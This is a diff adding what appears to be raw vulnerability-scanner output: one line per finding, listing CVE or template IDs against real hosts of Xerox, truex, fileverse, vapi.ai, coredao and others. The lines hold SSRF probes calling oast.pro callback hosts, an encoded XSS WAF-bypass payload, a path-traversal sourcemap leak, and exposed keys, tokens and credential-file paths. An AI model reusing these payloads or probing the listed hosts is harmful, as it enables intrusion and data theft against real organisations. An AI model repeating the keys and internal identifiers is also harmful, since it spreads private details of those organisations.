@@ -1,0 +1,122 @@
+[CVE-2017-9506] [http] [medium] https://ddocs-indexer.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://da05jlaai4kjlh8gvtbggypfsu3yugapu.oast.pro
+[CVE-2017-9506] [http] [medium] https://identity-v1.fileverse.io/plugins/servlet/oauth/users/icon-uri?consumerUri=http://da09rp2ai4kjlg9m3jpgq44xb9q8if9sx.oast.pro
+[CVE-2020-10770] [http] [medium] https://ddocs-indexer.fileverse.io/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://da05jlaai4kjlh8gvtbgqck3yizzesja8.oast.pro/
+[CVE-2020-10770] [http] [medium] https://identity-v1.fileverse.io/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://da09rp2ai4kjlg9m3jpghz4tdh7og7rbx.oast.pro/
+[CVE-2020-28185] [http] [medium] https://staking-api.coredao.org/tos/index.php?user/login
+[CVE-2020-5775] [http] [medium] https://ddocs-indexer.fileverse.io/external_content/retrieve/oembed?endpoint=http://da05jlaai4kjlh8gvtbgkqadk1dnnytyj.oast.pro&url=foo
+[CVE-2020-5775] [http] [medium] https://identity-v1.fileverse.io/external_content/retrieve/oembed?endpoint=http://da09rp2ai4kjlg9m3jpgf8y7xe1fx4upg.oast.pro&url=foo
+[CVE-2021-37598] [http] [medium] https://german.news.xerox.com/wp-json
+[CVE-2021-37598] [http] [medium] https://latam-es.news.xerox.com/wp-json
+[CVE-2021-37598] [http] [medium] https://legalpractice.support.xerox.com/wp-json
+[CVE-2021-37598] [http] [medium] https://www.scan-to-onbase.support.xerox.com/wp-json
+[CVE-2022-41697] [http] [medium] https://blog.teller.org/ghost/api/admin/session
+[CVE-2023-5561] [http] [medium] https://inquiry.shop.xerox.com/?rest_route=/wp/v2/users&search=@ [route="?rest_route=/wp/v2/users&"]
+[CVE-2026-32230] [http] [medium] https://status.dashboard.layeredge.io/api/badge/1/ping/24
+[CVE-2026-32230] [http] [medium] https://status.layeredge.io/api/badge/1/ping/24
+[CVE-2026-39365] [http] [medium] https://kaishuai-dev.allscale.io/node_modules/.vite/deps/../../../config.production.js.map ["/Users/wangkaishuai/allscale/frontend-va-p2/config.production.js"]
+[CVE-2026-55592] [http] [medium] https://chat.dappier.com/healthz ["1.0.0"]
+[CVE-2026-55592] [http] [medium] https://chat.dev.dappier.com/healthz ["1.0.0"]
+[CVE-2026-55592] [http] [medium] https://chat.staging.dappier.com/healthz ["1.0.0"]
+[CVE-2026-55592] [http] [medium] https://staking-api.coredao.org/healthz ["1.0.0"]
+[azure-instrumentation-key-exposure] [http] [medium] https://c2a-o365-web-dev.services.xerox.com ["b44215a4-a244-4c33-a37d-b240704320ee"]
+[claude-settings-exposure] [http] [medium] https://kaishuai-dev.allscale.io/.claude/settings.json
+[configuration-listing] [http] [medium] https://voipmonitor.vapi.ai/config/
+[credentials-json] [http] [medium] https://content.vapi.ai/credentials.json
+[eol-openssh-debian] [javascript] [medium] topdocs.truex.com:22 ["SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u4"]
+[jolokia-config-exposure] [http] [medium] https://staking-api.coredao.org/jolokia-agent.properties
+[nextjs-vite-public-env:public_env] [http] [medium] https://newsletter.arch.network [""VITE_CAL_OAUTH_CLIENT_ID":"cmh1rxzo40003ql1r4zddst44"",""VITE_HUMAN_ENABLED":"true"",""VITE_HUMAN_URL":"//client.px-cloud.net/PXeBumDLwe/main.min.js"",""VITE_ADNETWORK_PIXELJS_URL":"https://beehiiv-adnetwork-production.s3.amazonaws.com/pixel-js.js"",""VITE_EXTERNAL_EMBED_DOMAIN":"beehiivusercontent.com"",""VITE_STYTCH_DEVICE_FINGERPRINTING_ENABLED":"true"",""VITE_STYTCH_PUBLIC_TOKEN":"public-token-live-bb368f5c-d1e6-477a-b194-cba5627e95f1"",""VITE_STYTCH_SUBMIT_URL":"tw-bt.beehiiv.com"",""VITE_STYTCH_TELEMETRY_URL":"https://elements.stytch.com/telemetry.js"",""VITE_ADNETWORK_PIXELV2_URL":"https://beehiiv-adnetwork-production.s3.amazonaws.com/pixel-v2.js"",""VITE_BIRDIE_CLIENT_ID":"q2je1lwj"",""VITE_SHOW_NECTAR_CONSOLE":"false""]
+[nexus-repository-anonymous-access] [http] [medium] https://staking-api.coredao.org/service/rest/v1/repositories
+[prometheus-metrics] [http] [medium] https://aevo-prod-monitor.socket.tech/metrics
+[prometheus-metrics] [http] [medium] https://bridge.alephium.org/metrics
+[prometheus-metrics] [http] [medium] https://explorer-beta.test.arch.network/metrics
+[prometheus-metrics] [http] [medium] https://explorer.arch.network/metrics
+[prometheus-metrics] [http] [medium] https://grafana-explore.dev.hubbleprotocol.io/metrics
+[prometheus-metrics] [http] [medium] https://grafana-explore.hubbleprotocol.io/metrics
+[prometheus-metrics] [http] [medium] https://ledger.api.across.to/metrics
+[prometheus-metrics] [http] [medium] https://logging-loki.infra2.candide.dev/metrics
+[prometheus-metrics] [http] [medium] https://loki.infra3.candide.dev/metrics
+[prometheus-metrics] [http] [medium] https://metrics-api.irys.xyz/metrics
+[prometheus-metrics] [http] [medium] https://n8n.dappier.com/metrics
+[prometheus-metrics] [http] [medium] https://node-ovh.mainnet.alephium.org/metrics
+[prometheus-metrics] [http] [medium] https://not-dashboard.irys.xyz/metrics
+[prometheus-metrics] [http] [medium] https://subgraph-api-omega.towns.com/metrics
+[prometheus-metrics] [http] [medium] https://vault-v-ledger.beta.staging.across.to/metrics
+[prometheus-metrics] [http] [medium] https://xplore.api.v2.routerprotocol.com/metrics
+[rails-debug-mode] [http] [medium] https://qa-api.truex.com/3HyEwpWNQ5M6JsVK4nwanM1HKJk
+[rails-debug-mode] [http] [medium] https://qa-ee.truex.com/3HyEwpWNQ5M6JsVK4nwanM1HKJk
+[salesforce-community-misconfig] [http] [medium] https://partnerportal.xerox.com/s/sfsites/aura
+[sap-netweaver-info-leak] [http] [medium] https://cr3.eur.xerox.com/sap/public/info ["<RFCDEST>vcrbdi04_CRB_69</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://crb.eur.xerox.com/sap/public/info ["<RFCDEST>vcrbdi03_CRB_68</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://crp.eur.xerox.com/sap/public/info ["<RFCDEST>vcrpdi20_CRP_85</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://crp.idns-ext.xerox.com/sap/public/info ["<RFCDEST>vcrpdi21_CRP_86</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://crr.eur.xerox.com/sap/public/info ["<RFCDEST>vcrrci_CRR_65</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-033.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vhrrci_HRR_75</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-034.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vcrrci_CRR_65</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-035.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vecrci_ECR_40</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-036.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vsrrci_SRR_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-036.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vsrrci_SRR_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-037.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vewrci_EWR_45</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-037.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vewrci_EWR_45</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-062.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vsrpci_SRP_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-063.epn.eurgw.xerox.com/sap/public/info ["<RFCDEST>vcrpdi27_CRP_92</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-063.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vcrpdi28_CRP_93</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-063.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vcrpdi12_CRP_77</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-064.epn.eurgw.xerox.com/sap/public/info ["<RFCDEST>vhrpdi01_HRP_76</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-064.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vhrpdi01_HRP_76</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-064.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vhrpci_HRP_75</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-066.epn.eurgw.xerox.com/sap/public/info ["<RFCDEST>vecpci_ECP_40</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-066.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vecpdi02_ECP_42</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-066.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vecpdi01_ECP_41</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-067.epn.eurgw.xerox.com/sap/public/info ["<RFCDEST>vewpdi06_EWP_51</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-067.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vewpdi07_EWP_52</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-067.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vewpdi05_EWP_50</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-105.epn.eurgw.xerox.com/sap/public/info ["<RFCDEST>vcrbdi05_CRB_70</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-105.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vcrbdi10_CRB_75</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-105.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vcrbdi13_CRB_78</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-106.epn.eurgw.xerox.com/sap/public/info ["<RFCDEST>vecbdi03_ECB_43</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-106.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vecbdi02_ECB_42</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-106.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vecbci_ECB_40</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-107.epn.eurgw.xerox.com/sap/public/info ["<RFCDEST>vsrbci_SRB_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-107.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vsrbci_SRB_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-107.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vsrbci_SRB_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-108.epn.eurgw.xerox.com/sap/public/info ["<RFCDEST>vewbdi07_EWB_52</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-108.epn.uknorthgw.xerox.com/sap/public/info ["<RFCDEST>vewbdi08_EWB_53</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://css-vip-108.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vewbdi06_EWB_51</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://cvp.eur.xerox.com/sap/public/info ["<RFCDEST>vnrpdi14_NRP_14</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://cvt.eur.xerox.com/sap/public/info ["<RFCDEST>vnpsdi16_NPS_16</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ec3.eur.xerox.com/sap/public/info ["<RFCDEST>vewbdi02_EWB_47</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ecb.eur.xerox.com/sap/public/info ["<RFCDEST>vecbdi02_ECB_42</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ecp.eur.xerox.com/sap/public/info ["<RFCDEST>vecpdi04_ECP_44</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ecp.idns-ext.xerox.com/sap/public/info ["<RFCDEST>vecpdi05_ECP_45</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ecr.eur.xerox.com/sap/public/info ["<RFCDEST>vecrci_ECR_40</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://eutc2cssvip-13-16-33-191.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vnpsdi14_NPS_14</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://eutc2cssvip-13-16-33-192.epn.uksouthgw.xerox.com/sap/public/info ["<RFCDEST>vnrpci_NRP_25</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ewb.eur.xerox.com/sap/public/info ["<RFCDEST>vewbdi02_EWB_47</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ewp.eur.xerox.com/sap/public/info ["<RFCDEST>vewpdi01_EWP_46</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ewp.idns-ext.xerox.com/sap/public/info ["<RFCDEST>vewpdi02_EWP_47</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://ewr.eur.xerox.com/sap/public/info ["<RFCDEST>vewrci_EWR_45</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://hr3.eur.xerox.com/sap/public/info ["<RFCDEST>vecbci_ECB_40</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://hrr.eur.xerox.com/sap/public/info ["<RFCDEST>vhrrci_HRR_75</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://rp-cvp.idns.xerox.com/sap/public/info ["<RFCDEST>vnrpci_NRP_25</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://rp-cvt.idns.xerox.com/sap/public/info ["<RFCDEST>vnpsdi13_NPS_13</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://srb.eur.xerox.com/sap/public/info ["<RFCDEST>vsrbci_SRB_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://srp.eur.xerox.com/sap/public/info ["<RFCDEST>vsrpci_SRP_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://srp.idns-ext.xerox.com/sap/public/info ["<RFCDEST>vsrpdi01_SRP_61</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://srr.eur.xerox.com/sap/public/info ["<RFCDEST>vsrrci_SRR_20</RFCDEST>"]
+[sap-netweaver-info-leak] [http] [medium] https://xi3.eur.xerox.com/sap/public/info ["<RFCDEST>vsrbci_SRB_20</RFCDEST>"]
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://au-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://ca-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://de-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://es-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://fr-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://gb-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://it-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://nl-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://nz-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://xbs-uk-advanced-uk-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://xbs-uk-altodigital-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://xbs-uk-arenagroup-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://xbs-uk-concept-group-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wordpress-wordfence-waf-bypass-xss] [http] [medium] https://xbs-uk-itecgroup-be-rc.origin.xerox.com/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
+[wp-jetpack-ssrf] [http] [medium] https://topdocs.truex.com/wp-json/wpcom/v2/tweetstorm/generate-cards
